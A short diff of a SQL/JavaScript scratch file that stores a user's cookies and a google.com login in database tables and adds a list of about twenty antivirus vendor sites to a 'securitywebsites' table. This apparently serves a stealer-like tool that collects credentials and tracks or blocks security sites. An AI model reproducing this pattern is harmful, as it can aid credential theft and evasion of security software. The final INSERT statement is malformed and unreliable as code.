@@ -19,4 +19,14 @@ INSERT INTO cookies (UserID, Domain, Name, Value) VALUES (111, 'google.com', 'go
 
 INSERT INTO loginInfo (UserID, URL, Username, UserPassword) VALUES ('111','google.com','bob23','nickname123') on duplicate key update Username='newUser', UserPassword='newPass'
 
+var webArr = ["norton", "bitdefender", "eset", "webrootanywhere",
+"kaspersky", "pandasecurity", "trendmicro", "avg", "avast", "avira",
+"f-secure", "sophos", "mcafee", "checkpoint", "totalav", "scanguard",
+"bullguard", "emsisoft", "comodo", "symantec"];
 
+INSERT INTO securitywebsites (URL) VALUES (("norton"), ("bitdefender"), ("eset"), 
+("webrootanywhere"),("kaspersky"), ("pandasecurity"), ("trendmicro"), ("avg"), ("avast"), ("avira"),
+("f-secure"), ("sophos"), ("mcafee"), ("checkpoint"), ("totalav"), ("scanguard"),
+"kaspersky", "pandasecurity", "trendmicro", "avg", "avast", "avira",
+"f-secure", "sophos", "mcafee", "checkpoint", "totalav", "scanguard",
+("bullguard"), ("emsisoft"), ("comodo"), ("symantec"))
